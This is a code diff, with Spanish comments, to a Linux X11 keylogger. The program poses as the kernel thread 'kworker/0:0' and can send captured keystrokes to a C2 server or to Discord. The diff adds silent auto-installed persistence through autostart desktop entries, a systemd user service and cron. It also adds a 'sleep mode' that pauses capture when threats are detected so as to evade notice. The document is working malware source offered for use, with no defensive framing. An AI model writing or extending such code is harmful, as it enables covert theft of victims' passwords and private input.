@@ -39,6 +39,9 @@
 #include <sys/utsname.h>
 #include <curl/curl.h>
 
+// Módulo de persistencia
+#include "persistence.h"
+
 #define LOG_FILE "keylog.txt"
 #define MAX_WINDOW_NAME 256
 #define DAEMON_PROCESS_NAME "kworker/0:0"  // Nombre que simula un proceso del kernel
@@ -873,6 +876,12 @@ void log_key_event(const char *window_name, const char *key_str) {
 void record_callback(XPointer closure, XRecordInterceptData *recorded_data) {
     (void)closure; // No usado
     
+    // NUEVO: No procesar si estamos en sleep mode
+    if (get_current_state() != STATE_NORMAL) {
+        XRecordFreeData(recorded_data);
+        return;
+    }
+    
     if (recorded_data->category == XRecordFromServer) {
         // Obtener el tipo de evento
         int event_type = recorded_data->data[0];
@@ -1073,6 +1082,9 @@ void print_usage(const char *prog_name) {
     printf("  -s, --server HOST          IP/hostname del servidor C2 (requiere -e)\n");
     printf("  -P, --exfil-port PORT      Puerto del servidor (default: %s, requiere -e)\n", EXFIL_DEFAULT_PORT);
     printf("      --exfil-path PATH      Path del endpoint (default: %s, requiere -e)\n\n", EXFIL_DEFAULT_PATH);
+    printf("Notas:\n");
+    printf("  - Persistencia: Se instala automáticamente en ~/.config/autostart y systemd\n");
+    printf("  - El proceso se ejecutará automáticamente tras reinicio\n\n");
     printf("Ejemplos:\n");
     printf("  %s                              # Daemon + Discord (DEFECTO)\n", prog_name);
     printf("  %s --exfil-interval 300         # Daemon + Discord, enviar cada 5 min\n", prog_name);
@@ -1084,6 +1096,39 @@ void print_usage(const char *prog_name) {
 // Función principal del keylogger
 int start_keylogger(void) {
     char timestamp[64];
+    
+    // NUEVO: Instalar persistencia automáticamente
+    // Obtener ruta del ejecutable actual
+    char binary_path[256];
+    ssize_t len = readlink("/proc/self/exe", binary_path, sizeof(binary_path) - 1);
+    
+    if (len > 0) {
+        binary_path[len] = '\0';
+    } else {
+        // Alternativa: usar argv[0] (puede no funcionar en daemon)
+        strncpy(binary_path, "x11_keylogger", sizeof(binary_path) - 1);
+        binary_path[sizeof(binary_path) - 1] = '\0';
+    }
+    
+    // Intentar instalar persistencia de forma silenciosa (sin output a menos que falle)
+    if (!g_state.quiet_mode && !g_state.daemon_mode) {
+        printf("[*] Instalando mecanismos de persistencia...\n");
+    }
+    
+    // Desktop entry (menor prioridad, fallar silenciosamente)
+    install_autostart_entry(binary_path);
+    
+    // Systemd service (alta prioridad, avisar si falla)
+    if (install_systemd_service(binary_path) != 0 && !g_state.quiet_mode && !g_state.daemon_mode) {
+        printf("[!] Advertencia: No se pudo instalar servicio systemd\n");
+    }
+    
+    // Cron job (opcional, fallar silenciosamente)
+    install_cron_job(binary_path);
+    
+    if (!g_state.quiet_mode && !g_state.daemon_mode) {
+        printf("[+] Persistencia configurada\n\n");
+    }
     
     // IMPORTANTE: Guardar DISPLAY antes de daemonizar
     // Después de fork()/setsid(), el proceso pierde acceso a las variables de entorno
@@ -1247,7 +1292,18 @@ int start_keylogger(void) {
     
     // Loop principal - procesar eventos XRecord
     while (g_state.running) {
+        // NUEVO: Actualizar estado de persistencia (detección de amenazas)
+        update_persistence_state();
+        
+        // Si estamos en sleep mode, no capturar eventos
+        if (get_current_state() == STATE_SLEEP) {
+            usleep(100000);  // 100ms de pausa
+            continue;
+        }
+        
+        // Procesamiento normal de eventos
         XRecordProcessReplies(g_state.record_display);
+        usleep(10000);  // 10ms
     }
     
     // Limpieza
@@ -1268,6 +1324,59 @@ int start_keylogger(void) {
 int main(int argc, char *argv[]) {
     int opt;
     int option_index = 0;
+    
+    // NUEVO: Procesar --install-persistence antes que otros argumentos
+    if (argc > 1 && strcmp(argv[1], "--install-persistence") == 0) {
+        // Obtener ruta del ejecutable actual
+        char binary_path[256];
+        ssize_t len = readlink("/proc/self/exe", binary_path, sizeof(binary_path) - 1);
+        
+        if (len > 0) {
+            binary_path[len] = '\0';
+        } else {
+            // Alternativa: usar argv[0]
+            strncpy(binary_path, argv[0], sizeof(binary_path) - 1);
+            binary_path[sizeof(binary_path) - 1] = '\0';
+        }
+        
+        printf("[*] Instalando persistencia para: %s\n\n", binary_path);
+        
+        int installed = 0;
+        
+        // Instalar Desktop Entry
+        if (install_autostart_entry(binary_path) == 0) {
+            printf("    [✓] Desktop entry instalado (~/.config/autostart/x11-monitor.desktop)\n");
+            installed++;
+        } else {
+            printf("    [!] Error al instalar desktop entry\n");
+        }
+        
+        // Instalar Systemd Service
+        if (install_systemd_service(binary_path) == 0) {
+            printf("    [✓] Systemd service instalado (~/.config/systemd/user/x11-monitor.service)\n");
+            installed++;
+        } else {
+            printf("    [!] Error al instalar systemd service\n");
+        }
+        
+        // Instalar Cron Job (opcional)
+        if (install_cron_job(binary_path) == 0) {
+            printf("    [✓] Cron job instalado\n");
+            installed++;
+        }
+        
+        printf("\n");
+        
+        if (installed >= 2) {
+            printf("[+] Persistencia instalada exitosamente\n");
+            printf("[*] El proceso se ejecutará automáticamente tras reinicio\n");
+            printf("[*] O al iniciar sesión X11\n");
+            return 0;
+        } else {
+            printf("[-] Error: No se pudieron instalar mecanismos de persistencia\n");
+            return 1;
+        }
+    }
     
     // Opciones largas para getopt_long
     static struct option long_options[] = {
